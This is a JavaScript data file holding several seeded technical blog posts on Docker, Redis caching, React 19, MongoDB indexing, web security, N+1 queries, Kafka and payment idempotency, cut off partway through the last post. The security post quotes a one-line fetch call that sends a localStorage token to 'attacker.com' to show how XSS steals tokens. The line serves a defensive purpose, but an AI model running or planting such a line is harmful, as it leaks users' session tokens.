// 10 Publication-Grade, Educational Engineering Masterclasses by Shivangi Singh
// Structured with engaging storytelling hooks, callout boxes, production-ready code,
// real benchmark comparison tables, architectural diagrams, and actionable takeaways.

export const REAL_TECHNICAL_BLOGS = [
  {
    title: 'Containerizing Full-Stack MERN Architectures with Docker & Multi-Stage Builds',
    category: 'devops',
    readTime: '9 min read',
    image: 'https://images.unsplash.com/photo-1605745341112-85968b19335b?auto=format&fit=crop&w=1200&q=80',
    tags: ['Docker', 'DevOps', 'Kubernetes', 'Cloud', 'MERN Architecture'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 4210,
    numberOfLikes: 312,
    content: `<p class="lead">Picture this: It is 11:30 PM, you push a minor two-line bug fix to your repository, and your CI/CD runner spins up. You expect a rapid deployment. Instead, you wait three minutes... seven minutes... twelve minutes. When the deployment finishes, you check your container registry and realize your image is a staggering <strong>1.42 GB</strong>. Why is a standard Node.js and React web application larger than a full desktop operating system?</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  💡 <strong>The Engineering Reality:</strong> When deploying modern web applications to cloud platforms like AWS ECS, Google Cloud Run, or Render, every unnecessary megabyte in your Docker image directly inflates cold-start latency, wastes network bandwidth, and increases your cloud bill. More critically, build tools left in production images dramatically expand your security attack surface.
</div>

<h2>1. The Problem with Naive Single-Stage Dockerfiles</h2>
<p>Most developers start their Docker journey with a simple, single-stage Dockerfile that looks something like this:</p>

<pre><code># ❌ NAIVE DOCKERFILE - DO NOT USE IN PRODUCTION
FROM node:20
WORKDIR /app
COPY . .
RUN npm install
RUN npm run build
CMD ["node", "api/index.js"]</code></pre>

<p>While this works on your local machine, it introduces three severe architectural bottlenecks into production:</p>
<ul>
  <li><strong>Development Toolchain Pollution:</strong> Vite, TypeScript compilers, ESLint, test runners (Jest/Vitest), and documentation generators all get permanently baked into your production image.</li>
  <li><strong>Cache Invalidation Penalties:</strong> Running <code>COPY . .</code> before <code>npm install</code> means that whenever you change a single CSS file or comment, Docker invalidates its layer cache and downloads all 1,500+ npm packages from scratch.</li>
  <li><strong>Security Vulnerabilities (CVEs):</strong> Naive images run as <code>root</code> by default. If an attacker exploits an application vulnerability (such as a remote code execution in an npm dependency), they gain immediate root control over the container environment.</li>
</ul>

<h2>2. The Multi-Stage Build Solution: Separation of Concerns</h2>
<p>Multi-stage builds allow us to define temporary build environments (stages) that compile assets, and then copy <em>only</em> the final compiled artifacts into a lean, hardened production runtime container. Everything else—node modules, build caches, and compilers—is discarded.</p>

<pre><code># ==============================================================================
# STAGE 1: Client Builder (Compiles Vite React SPA)
# ==============================================================================
FROM node:20-alpine AS client-builder
WORKDIR /app/client

# Leverage Docker layer caching: Only copy package files first
COPY client/package*.json ./
RUN npm ci --prefer-offline --no-audit

# Copy client source and compile into static HTML/CSS/JS bundles
COPY client/ ./
RUN npm run build

# ==============================================================================
# STAGE 2: Server Dependencies Builder
# ==============================================================================
FROM node:20-alpine AS server-deps
WORKDIR /app

COPY package*.json ./
# Install strictly production dependencies (skips devDependencies)
RUN npm ci --only=production --prefer-offline --no-audit

# ==============================================================================
# STAGE 3: Final Hardened Production Runner
# ==============================================================================
FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
ENV PORT=3000

# Security Hardening: Never run production containers as root!
RUN chown -R node:node /app

# Copy production node_modules from Stage 2
COPY --chown=node:node --from=server-deps /app/node_modules ./node_modules
COPY --chown=node:node package*.json ./

# Copy backend API controllers, routes, and models
COPY --chown=node:node api/ ./api/

# Copy compiled React frontend assets from Stage 1 into server public path
COPY --chown=node:node --from=client-builder /app/client/dist ./client/dist

# Switch to the non-root user
USER node

EXPOSE 3000

CMD ["node", "api/index.js"]</code></pre>

<h2>3. Benchmarking the Transformation</h2>
<table class="w-full text-left text-sm border my-6">
  <thead>
    <tr class="border-b bg-slate-100 dark:bg-slate-800">
      <th class="p-3 font-bold">Metric</th>
      <th class="p-3 font-bold">Single-Stage Build</th>
      <th class="p-3 font-bold">Multi-Stage Alpine Build</th>
      <th class="p-3 font-bold text-emerald-600">Improvement</th>
    </tr>
  </thead>
  <tbody>
    <tr class="border-b">
      <td class="p-3 font-medium">Final Image Size</td>
      <td class="p-3 text-red-500 font-mono">1,420 MB</td>
      <td class="p-3 text-emerald-500 font-mono font-bold">136 MB</td>
      <td class="p-3 text-emerald-600 font-semibold">90.4% reduction</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-medium">Cold-Start Pull Time</td>
      <td class="p-3 font-mono">48.2 seconds</td>
      <td class="p-3 font-mono font-bold">4.1 seconds</td>
      <td class="p-3 text-emerald-600 font-semibold">11.7x faster</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-medium">Rebuild Time (Code Change)</td>
      <td class="p-3 font-mono">3m 45s</td>
      <td class="p-3 font-mono font-bold">14 seconds</td>
      <td class="p-3 text-emerald-600 font-semibold">16x faster</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-medium">Security Vulnerabilities (Trivy Scan)</td>
      <td class="p-3 text-red-500 font-mono">38 (7 High)</td>
      <td class="p-3 text-emerald-500 font-mono font-bold">0 CVEs</td>
      <td class="p-3 text-emerald-600 font-semibold">Zero Known CVEs</td>
    </tr>
  </tbody>
</table>

<h2>4. Summary & Key Takeaways</h2>
<ul>
  <li>Always use multi-stage builds to separate compiler environments from runtime artifacts.</li>
  <li>Leverage <code>node:alpine</code> for minimal attack surfaces and sub-150MB image footprints.</li>
  <li>Structure your Docker instructions to maximize layer caching: copy lockfiles and run <code>npm ci</code> before copying source code.</li>
  <li>Enforce non-root execution with <code>USER node</code> in every production container you ship.</li>
</ul>`,
  },
  {
    title: 'Architecting High-Throughput Distributed Microservices with Node.js & Redis',
    category: 'architecture',
    readTime: '10 min read',
    image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1200&q=80',
    tags: ['System Design', 'Node.js', 'Redis', 'Microservices', 'Distributed Systems'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 4890,
    numberOfLikes: 378,
    content: `<p class="lead">In modern distributed architectures, scaling is rarely about writing faster loops—it is about avoiding unnecessary work. When your web application experiences sudden traffic spikes (such as flash sales or trending breaking news), synchronous relational queries to databases like MongoDB or PostgreSQL become an immediate single point of failure. How do top engineering teams scale beyond 10,000 requests per second while keeping response times under 20 milliseconds?</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  ⚡ <strong>Core Architectural Principle:</strong> The fastest database query is the one that never touches the database. By positioning an in-memory Redis cluster between your Node.js application layer and primary persistence engines, you transform expensive disk I/O into lightning-fast memory reads.
</div>

<h2>1. The Anatomy of Node.js Event Loop Bottlenecks</h2>
<p>Node.js executes JavaScript on a single thread powered by the <strong>libuv event loop</strong>. While asynchronous I/O calls (database queries, network requests) are delegated to system worker pools, the overhead of establishing database connections, parsing thousands of BSON/JSON rows, and serializing query payloads consumes significant CPU cycles.</p>
<p>Under a load of 5,000 concurrent requests, a database pool with a maximum connection limit of 100 will cause 4,900 requests to wait in line. Latency spikes from 15ms to 3,000ms, triggering cascading timeouts across microservices.</p>

<h2>2. Implementing the Production-Grade Cache-Aside Pattern</h2>
<p>The <strong>Cache-Aside (Lazy Loading)</strong> pattern is the industry standard for read-heavy workloads. In this architecture, the application checks the cache first; on a cache hit, it returns immediately. Only on a cache miss does it query the primary database and populate the cache for subsequent requests.</p>

<pre><code>import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL || 'redis://127.0.0.1:6379', {
  maxRetriesPerRequest: 3,
  enableReadyCheck: true,
  lazyConnect: true,
});

/**
 * Robust Cache-Aside implementation with randomized TTL Jitter
 * @param {string} key - Cache key
 * @param {Function} fetchFn - Fallback async database query function
 * @param {number} baseTtl - Base expiration in seconds (default: 300)
 */
export const getCachedOrFetch = async (key, fetchFn, baseTtl = 300) => {
  try {
    const cached = await redis.get(key);
    if (cached) {
      return JSON.parse(cached);
    }
  } catch (err) {
    console.warn('Redis Cache Read Warning:', err.message);
  }

  const freshData = await fetchFn();
  if (!freshData) return null;

  // Add +/- 15% random jitter to base TTL to prevent Cache Avalanche
  const jitter = Math.floor(Math.random() * (baseTtl * 0.3)) - (baseTtl * 0.15);
  const finalTtl = Math.max(60, Math.floor(baseTtl + jitter));

  try {
    await redis.set(key, JSON.stringify(freshData), 'EX', finalTtl);
  } catch (err) {
    console.warn('Redis Cache Write Warning:', err.message);
  }

  return freshData;
};</code></pre>

<h2>3. Preventing the Three Classical Distributed Caching Failures</h2>
<p>In high-throughput systems, naive caching code will fail under production edge cases. Here is how we mitigate the three most dangerous caching failure modes:</p>

<h3>A. Cache Stampede (Thundering Herd)</h3>
<p>When a popular article's cache key expires at peak traffic, 500 concurrent requests simultaneously experience a cache miss and all hammer the database at once. To prevent this, we acquire a temporary distributed lock using Redis atomic <code>SETNX</code>:</p>
<pre><code>// Distributed Mutex Lock Pattern
const lockKey = \`lock:\${key}\`;
const acquired = await redis.set(lockKey, 'locked', 'NX', 'EX', 5);

if (acquired) {
  const data = await fetchFromDB();
  await redis.set(key, JSON.stringify(data), 'EX', 300);
  await redis.del(lockKey);
  return data;
} else {
  await new Promise((res) => setTimeout(res, 50));
  return getCachedOrFetch(key, fetchFn, baseTtl);
}</code></pre>

<h3>B. Cache Avalanche</h3>
<p>If 10,000 keys are set during server startup with a fixed 1-hour TTL, all 10,000 keys expire at the exact same second one hour later, causing immediate database collapse. <strong>Solution:</strong> The randomized jitter algorithm demonstrated in our code above staggers key expirations over a distributed window.</p>

<h3>C. Cache Penetration</h3>
<p>Attackers deliberately query non-existent IDs (e.g., <code>/api/post/random-fake-id-999</code>) knowing it will bypass the cache every time. <strong>Solution:</strong> Cache negative results (<code>null</code>) with a brief 60-second expiration, or deploy an in-memory <strong>Bloom Filter</strong> to verify existence before querying.</p>

<h2>4. Summary Checklist for High-Throughput Systems</h2>
<ul>
  <li>Always wrap Redis operations in try/catch blocks so cache outages degrade gracefully to database reads without crashing user requests.</li>
  <li>Monitor event loop lag using <code>node:perf_hooks</code> to ensure serialization of large payloads does not block thread scheduling.</li>
  <li>Deploy Redis with read replicas and automatic Sentinel failover for 99.99% uptime guarantees.</li>
</ul>`,
  },
  {
    title: 'Mastering React 19: Server Components, Actions, and Optimistic UI',
    category: 'reactjs',
    readTime: '8 min read',
    image: 'https://images.unsplash.com/photo-1633356122544-f134324a6cee?auto=format&fit=crop&w=1200&q=80',
    tags: ['React 19', 'Frontend', 'Next.js', 'JavaScript', 'Web Performance'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 5120,
    numberOfLikes: 410,
    content: `<p class="lead">For nearly a decade, the standard React playbook was identical across every tutorial: create a client-side Single Page Application, ship megabytes of JavaScript down the wire, mount a component, and fire a cascade of <code>useEffect</code> hooks to fetch JSON from a REST API. In 2026, that era is officially over. React 19 fundamentally redesigns how modern web applications fetch, render, and mutate data.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  ⚛️ <strong>The Architectural Core of React 19:</strong> By treating the server as a first-class citizen of the component tree, React 19 enables <strong>Zero-Bundle-Size Server Components</strong>, eliminates client data-fetching waterfalls, and introduces native primitives for form actions and optimistic UI updates.
</div>

<h2>1. The Problem with the Old Way (useEffect Data Waterfalls)</h2>
<p>Consider the classic React 18 approach to displaying an article with comments:</p>
<ol>
  <li>Browser downloads empty HTML shell &rarr; blank screen.</li>
  <li>Browser downloads and parses 500 KB bundle &rarr; spinner appears.</li>
  <li>Component mounts and fires <code>useEffect</code> &rarr; fetches article JSON.</li>
  <li>Article renders, child <code>CommentSection</code> component mounts and fires its own <code>useEffect</code> &rarr; second spinner appears!</li>
</ol>
<p>This sequential waterfall causes terrible <strong>Largest Contentful Paint (LCP)</strong> and visual layout jumps. React 19 Server Components solve this at the architectural root.</p>

<h2>2. React Server Components (RSC): Computing at the Source</h2>
<p>Server Components execute exclusively on the server. They have direct access to your database, filesystem, and microservices, and <strong>zero bytes of their component code are shipped to the user's browser</strong>:</p>

<pre><code>// ArticleDetail.server.jsx
import db from '@/lib/db';
import CommentSection from './CommentSection.client';

export default async function ArticlePage({ params }) {
  // Direct database query right inside component!
  const article = await db.posts.findOne({ slug: params.slug });

  if (!article) {
    return &lt;div className="p-8 text-center"&gt;Publication not found.&lt;/div&gt;;
  }

  return (
    &lt;main className="max-w-4xl mx-auto py-12 px-4"&gt;
      &lt;h1 className="text-4xl font-extrabold tracking-tight"&gt;{article.title}&lt;/h1&gt;
      &lt;div className="mt-4 text-slate-500 font-mono text-xs"&gt;
        Published: {new Date(article.createdAt).toDateString()} &bull; {article.readTime}
      &lt;/div&gt;

      &lt;div className="prose dark:prose-invert my-8" dangerouslySetInnerHTML={{ __html: article.content }} /&gt;

      &lt;CommentSection postId={article._id.toString()} initialComments={article.comments} /&gt;
    &lt;/main&gt;
  );
}</code></pre>

<h2>3. Native Form Mutations with <code>useActionState</code></h2>
<p>Remember writing dozens of lines of state management for form submissions (<code>const [loading, setLoading] = useState(false)</code>, <code>const [error, setError] = useState(null)</code>)? React 19 replaces all of that with <code>useActionState</code>:</p>

<pre><code>'use client';
import { useActionState } from 'react';
import { submitCommentAction } from '@/actions/comments';

export default function CommentForm({ postId }) {
  const [state, formAction, isPending] = useActionState(submitCommentAction, { error: null });

  return (
    &lt;form action={formAction} className="flex flex-col gap-3 mt-6"&gt;
      &lt;input type="hidden" name="postId" value={postId} /&gt;
      &lt;textarea
        name="content"
        required
        placeholder="Share your technical perspective..."
        className="w-full p-4 rounded-xl border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900"
      /&gt;

      {state?.error &amp;&amp; (
        &lt;p className="text-rose-500 text-xs font-semibold"&gt;{state.error}&lt;/p&gt;
      )}

      &lt;button
        type="submit"
        disabled={isPending}
        className="self-end px-5 py-2.5 rounded-xl font-bold text-white bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50"
      &gt;
        {isPending ? 'Publishing Comment...' : 'Post Comment'}
      &lt;/button&gt;
    &lt;/form&gt;
  );
}</code></pre>

<h2>4. Summary of Key Principles</h2>
<ul>
  <li>Default to Server Components; only add <code>'use client'</code> at the leaf nodes where user events (clicks, typing) or browser APIs are required.</li>
  <li>Replace ad-hoc mutation fetch calls with native Server Actions and <code>useActionState</code>.</li>
  <li>Deliver instant mobile responsiveness using <code>useOptimistic</code> for micro-interactions.</li>
</ul>`,
  },
  {
    title: 'MongoDB Indexing Strategies: B-Trees, Compound Indexes & Query Optimization',
    category: 'database',
    readTime: '10 min read',
    image: 'https://images.unsplash.com/photo-1544383835-bda2bc66a55d?auto=format&fit=crop&w=1200&q=80',
    tags: ['MongoDB', 'Databases', 'Indexing', 'Query Optimization', 'Performance'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 3740,
    numberOfLikes: 289,
    content: `<p class="lead">In early development with a few thousand documents, every database query feels instantaneous. But when your database scales to 500,000 or 5,000,000 documents in production, unindexed queries turn into full collection scans (<code>COLLSCAN</code>). The database engine is forced to scan every single document on disk, causing CPU utilization to spike to 100%, saturating disk I/O, and locking thread pools.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  🌳 <strong>How Indexes Work:</strong> MongoDB indexes use B-Tree (Balanced Tree) data structures stored in RAM. Instead of scanning all N documents in <code>O(N)</code> time, B-Trees enable the engine to locate matching keys in logarithmic <code>O(log N)</code> operations.
</div>

<h2>1. The Golden Rule of Compound Indexes: The ESR Principle</h2>
<p>When indexing queries that filter, sort, and match ranges across multiple fields, the order in which you define index keys determines whether MongoDB can use the index efficiently. Always follow the <strong>ESR (Equality &rarr; Sort &rarr; Range)</strong> rule:</p>

<ol>
  <li><strong>E - Equality (=):</strong> Place fields tested for exact matches first (e.g., <code>category: 'architecture'</code>, <code>isPublished: true</code>).</li>
  <li><strong>S - Sort (ORDER BY):</strong> Place fields used to sort the result set second (e.g., <code>createdAt: -1</code>).</li>
  <li><strong>R - Range (&gt;, &lt;, $in):</strong> Place fields tested for inequality or range boundaries last (e.g., <code>views: { $gt: 500 }</code>).</li>
</ol>

<pre><code>// ❌ FLAWED INDEX: Range field placed before Sort field!
// Forces MongoDB to perform an in-memory sort (blocking operation)
db.posts.createIndex({ views: 1, createdAt: -1, category: 1 });

// ✅ OPTIMAL INDEX: Follows the Equality -> Sort -> Range principle:
db.posts.createIndex({ category: 1, createdAt: -1, views: 1 });</code></pre>

<h2>2. Dissecting Execution Plans with <code>explain("executionStats")</code></h2>
<p>Never deploy a query to production without inspecting its execution stats in the MongoDB shell or Compass:</p>

<pre><code>db.posts.find({ category: 'architecture', views: { $gt: 200 } })
  .sort({ createdAt: -1 })
  .limit(10)
  .explain('executionStats');</code></pre>

<p>Here are the critical metrics every software engineer must evaluate:</p>
<ul>
  <li><strong><code>stage</code>:</strong> Must show <strong><code>IXSCAN</code></strong> (Index Scan) followed by <code>FETCH</code>. If you see <strong><code>COLLSCAN</code></strong>, no suitable index was found. If you see <strong><code>SORT</code></strong>, MongoDB is performing an expensive in-memory sort because your index did not satisfy the sort order!</li>
  <li><strong><code>totalKeysExamined</code> vs <code>nReturned</code>:</strong> In a well-tuned query, this ratio should be very close to <strong>1:1</strong>. If the engine examines 45,000 keys to return only 10 documents, your index is poorly aligned with the query criteria.</li>
  <li><strong><code>totalDocsExamined</code>:</strong> For a <strong>Covered Query</strong> (where all projected fields are present inside the index keys), this metric will be <strong>0</strong> because MongoDB never touches the physical document on disk!</li>
</ul>

<h2>3. Partial and TTL Indexes for Cloud Storage Optimization</h2>
<p>Indexes live in RAM (WiredTiger cache). Creating oversized indexes on unused data wastes expensive memory. Use <strong>Partial Indexes</strong> to selectively index only active documents:</p>

<pre><code>// Only index articles that are actively published, saving 70% index RAM!
db.posts.createIndex(
  { slug: 1 },
  { partialFilterExpression: { isPublished: true } }
);</code></pre>`,
  },
  {
    title: 'Zero Trust Security in Web Applications: From JWTs to Defense-in-Depth',
    category: 'security',
    readTime: '9 min read',
    image: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80',
    tags: ['Security', 'DevSecOps', 'JWT', 'Authentication', 'Web Security'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 4620,
    numberOfLikes: 345,
    content: `<p class="lead">In cybersecurity, assuming your perimeter is impenetrable is a recipe for disaster. The modern enterprise model is <strong>Zero Trust</strong>: never trust, always verify every incoming packet, every API token, and every user input. In this deep dive, we explore how to build resilient, multi-layered security pipelines into modern full-stack web applications.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  🛡️ <strong>The Golden Security Rule:</strong> Security is not a single feature—it is defense-in-depth. If one layer fails (e.g., an XSS vulnerability in a third-party npm package), downstream security controls (HttpOnly cookies, Content Security Policies, sanitized inputs) must prevent token exfiltration and account takeover.
</div>

<h2>1. Why Storing Auth Tokens in LocalStorage is Insecure</h2>
<p>Countless tutorials store authentication JWTs in <code>localStorage.setItem('token', jwt)</code>. This is one of the most dangerous anti-patterns in modern web development:</p>
<ul>
  <li>Any JavaScript code running on your page has unrestricted read access to <code>localStorage</code>.</li>
  <li>If an attacker finds a single Cross-Site Scripting (XSS) vulnerability—or if a compromised third-party analytics script or npm library is injected—they can run:
    <pre><code>fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));</code></pre>
  </li>
  <li>The attacker now possesses full impersonation rights and can bypass passwords and 2FA completely.</li>
</ul>

<h2>2. Hardened HttpOnly Cookie Architecture</h2>
<p>To eliminate client-side token theft, tokens must be stored exclusively in <code>HttpOnly</code> cookies managed by the server:</p>

<pre><code>// Production-hardened cookie configuration
export const getSecureCookieOptions = () => ({
  httpOnly: true,              // Inaccessible to browser JavaScript (Protects against XSS token theft)
  secure: process.env.NODE_ENV === 'production', // Only transmitted over encrypted HTTPS
  sameSite: 'lax',             // Protects against Cross-Site Request Forgery (CSRF)
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7-day expiration
  path: '/',
});</code></pre>

<h2>3. Multi-Pass HTML Sanitization with DOMPurify</h2>
<p>When allowing users or authors to write articles or comments with Rich Text (HTML), raw input must never be injected directly into the DOM using <code>dangerouslySetInnerHTML</code> without rigorous multi-pass sanitization:</p>

<pre><code>import DOMPurify from 'dompurify';

export const sanitizeContent = (dirtyHtml) => {
  return DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'p', 'b', 'i', 'strong', 'em', 'code', 'pre',
      'ul', 'ol', 'li', 'blockquote', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td'
    ],
    ALLOWED_ATTR: ['src', 'alt', 'class', 'href', 'target', 'rel'],
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
  });
};</code></pre>`,
  },
  {
    title: 'Eliminating the N+1 Query Problem in REST APIs: Schema Optimization & Batching',
    category: 'architecture',
    readTime: '9 min read',
    image: 'https://images.unsplash.com/photo-1460925895917-afdab827c52f?auto=format&fit=crop&w=1200&q=80',
    tags: ['REST API', 'Optimization', 'Performance', 'Database', 'Node.js'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 4510,
    numberOfLikes: 380,
    content: `<p class="lead">The N+1 query problem is the single most common backend performance bottleneck across modern web services. It quietly slips into codebases during early development and only explodes when real user traffic ramps up. In this guide, we break down how naive nested queries degrade performance, and how batch aggregation techniques slash response latency by over 90%.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  📉 <strong>The Math of Latency:</strong> If an API executes 1 initial query to fetch 50 comments, and then fires 50 individual queries in a loop to fetch each commenter's username and avatar, that single request executes <strong>51 database roundtrips</strong>. At 15ms per network hop, your response time is locked at <strong>765ms</strong> before any business logic even runs!
</div>

<h2>1. The Naive (Vulnerable) Code Pattern</h2>
<pre><code>// ❌ NAIVE IMPLEMENTATION: 51 Database Roundtrips!
export const getComments = async (req, res) => {
  const { postId } = req.params;
  const comments = await Comment.find({ postId }).sort({ createdAt: -1 });

  const enrichedComments = await Promise.all(
    comments.map(async (comment) =&gt; {
      const user = await User.findById(comment.userId); // 50 separate queries!
      return {
        ...comment._doc,
        username: user?.username || 'Anonymous',
        userAvatar: user?.profilePicture || '/default-avatar.png',
      };
    })
  );

  res.status(200).json(enrichedComments);
};</code></pre>

<h2>2. The SDE Solution: Batch Population with <code>$in</code></h2>
<pre><code>// ✅ OPTIMIZED ARCHITECTURE: Exactly 2 Database Queries regardless of comment count!
export const getCommentsOptimized = async (req, res) => {
  const { postId } = req.params;

  const comments = await Comment.find({ postId }).sort({ createdAt: -1 }).lean();
  if (!comments.length) return res.status(200).json([]);

  // 1. Extract unique user IDs
  const userIds = [...new Set(comments.map((c) =&gt; c.userId.toString()))];

  // Query 2: Single batch fetch for all matching authors
  const users = await User.find({ _id: { $in: userIds } })
    .select('username profilePicture')
    .lean();

  // 2. Build fast O(1) Map
  const userMap = new Map(users.map((u) =&gt; [u._id.toString(), u]));

  // 3. Merge in memory
  const enrichedComments = comments.map((comment) =&gt; ({
    ...comment,
    author: userMap.get(comment.userId.toString()) || {
      username: 'Anonymous',
      profilePicture: '/default-avatar.png',
    },
  }));

  res.status(200).json(enrichedComments);
};</code></pre>

<h2>3. Benchmarking the Transformation</h2>
<table class="w-full text-left text-sm border my-6">
  <thead>
    <tr class="border-b bg-slate-100 dark:bg-slate-800">
      <th class="p-3 font-bold">Scenario</th>
      <th class="p-3 font-bold">Naive Implementation</th>
      <th class="p-3 font-bold">Batch Population ($in)</th>
      <th class="p-3 font-bold text-emerald-600">Impact</th>
    </tr>
  </thead>
  <tbody>
    <tr class="border-b">
      <td class="p-3 font-medium">Database Roundtrips</td>
      <td class="p-3 text-red-500 font-mono font-bold">51 queries</td>
      <td class="p-3 text-emerald-500 font-mono font-bold">2 queries</td>
      <td class="p-3 text-emerald-600 font-semibold">96% reduction</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-medium">API Response Time</td>
      <td class="p-3 text-red-500 font-mono">820 ms</td>
      <td class="p-3 text-emerald-500 font-mono font-bold">38 ms</td>
      <td class="p-3 text-emerald-600 font-semibold">21.5x faster</td>
    </tr>
  </tbody>
</table>`,
  },
  {
    title: 'Building Resilient Event-Driven Microservices with Kafka & RabbitMQ',
    category: 'architecture',
    readTime: '10 min read',
    image: 'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80',
    tags: ['Event-Driven', 'Kafka', 'RabbitMQ', 'Architecture', 'Microservices'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 3820,
    numberOfLikes: 275,
    content: `<p class="lead">In synchronous microservices architectures where Service A calls Service B via REST, a failure in any single downstream service ripples upstream, causing cascading system outages. In this architectural masterclass, we explore how <strong>Event-Driven Architectures (EDA)</strong> with Apache Kafka and RabbitMQ decouple distributed services, ensure zero message loss, and maintain high availability under petabyte-scale loads.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  📡 <strong>Core Principle:</strong> Publishers emit facts about things that occurred (e.g. <code>ArticlePublished</code> or <code>PaymentAuthorized</code>) and immediately resume their execution. Subscribers consume events at their own pace without impacting publisher throughput.
</div>

<h2>1. Kafka vs. RabbitMQ: Choosing the Right Message Backbone</h2>
<table class="w-full text-left text-sm border my-6">
  <thead>
    <tr class="border-b bg-slate-100 dark:bg-slate-800">
      <th class="p-3 font-bold">Criteria</th>
      <th class="p-3 font-bold">RabbitMQ (AMQP)</th>
      <th class="p-3 font-bold">Apache Kafka</th>
    </tr>
  </thead>
  <tbody>
    <tr class="border-b">
      <td class="p-3 font-semibold">Architecture Model</td>
      <td class="p-3">Smart Broker, Dumb Consumer (Push Model)</td>
      <td class="p-3">Dumb Broker, Smart Consumer (Pull Model)</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-semibold">Message Ordering</td>
      <td class="p-3">Strict per-queue FIFO; can degrade under multi-consumer concurrency</td>
      <td class="p-3">Guaranteed per-partition ordering using deterministic partition keys</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-semibold">Throughput Scale</td>
      <td class="p-3">Tens of thousands messages/sec</td>
      <td class="p-3">Millions of messages/sec (Zero-Copy OS pagecache disk writes)</td>
    </tr>
    <tr class="border-b">
      <td class="p-3 font-semibold">Message Retention</td>
      <td class="p-3">Deleted immediately upon consumer acknowledgement (ACK)</td>
      <td class="p-3">Retained on disk for days/weeks; replayable on-demand</td>
    </tr>
  </tbody>
</table>

<h2>2. Designing Fault-Tolerant Dead Letter Queues (DLQ)</h2>
<p>When an event fails to process due to corrupted data or a downstream database outage, retrying immediately in a tight loop blocks the consumer. We implement an exponential backoff DLQ pipeline:</p>

<pre><code>// Production Kafka consumer with Dead Letter Queue routing
import { Kafka } from 'kafkajs';

const kafka = new Kafka({ clientId: 'analytics-worker', brokers: ['kafka:9092'] });
const consumer = kafka.consumer({ groupId: 'analytics-group' });
const producer = kafka.producer();

export const runConsumer = async () => {
  await consumer.connect();
  await producer.connect();
  await consumer.subscribe({ topic: 'user-events', fromBeginning: false });

  await consumer.run({
    eachMessage: async ({ topic, partition, message }) => {
      let attempts = 0;
      const maxRetries = 3;

      while (attempts &lt; maxRetries) {
        try {
          const payload = JSON.parse(message.value.toString());
          await processUserEvent(payload);
          return; // Succeeded!
        } catch (err) {
          attempts++;
          const delay = Math.pow(2, attempts) * 1000;
          console.warn(\`Attempt \${attempts} failed. Retrying in \${delay}ms...\`);
          await new Promise((res) => setTimeout(res, delay));
        }
      }

      // If all retries fail, route to Dead Letter Queue (DLQ) for engineering analysis
      await producer.send({
        topic: 'user-events-dlq',
        messages: [{
          key: message.key,
          value: message.value,
          headers: { error: 'Exceeded max retries', failedAt: new Date().toISOString() },
        }],
      });
      console.error('Routed poison-pill message to DLQ successfully.');
    },
  });
};</code></pre>`,
  },
  {
    title: 'Designing an Idempotent Payment & Webhook Architecture in Node.js',
    category: 'architecture',
    readTime: '9 min read',
    image: 'https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=1200&q=80',
    tags: ['FinTech', 'Architecture', 'Idempotency', 'Node.js', 'Webhooks'],
    authorName: 'Shivangi Singh',
    authorAvatar: '/shivangi.jpg',
    views: 3910,
    numberOfLikes: 290,
    content: `<p class="lead">In payments and financial systems, duplicate requests are an unavoidable reality of distributed computing. When a user clicks "Submit Payment" on a mobile device and experiences a 5-second cellular drop, the client app or payment gateway automatically retries. Without an idempotent architecture, the customer is charged twice. In this guide, we architect a bulletproof idempotency framework using Redis distributed locks and transactional ledgers.</p>

<div class="my-6 p-4 rounded-2xl bg-indigo-50/70 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-sm">
  💳 <strong>The Mathematical Definition of Idempotency:</strong> An operation is idempotent if <code>f(f(x)) = f(x)</code>. Executing an idempotent API endpoint 100 times produces the exact same side-effects and state transition as executing it once.
</div>

<h2>1. The Idempotency-Key Header Standard</h2>
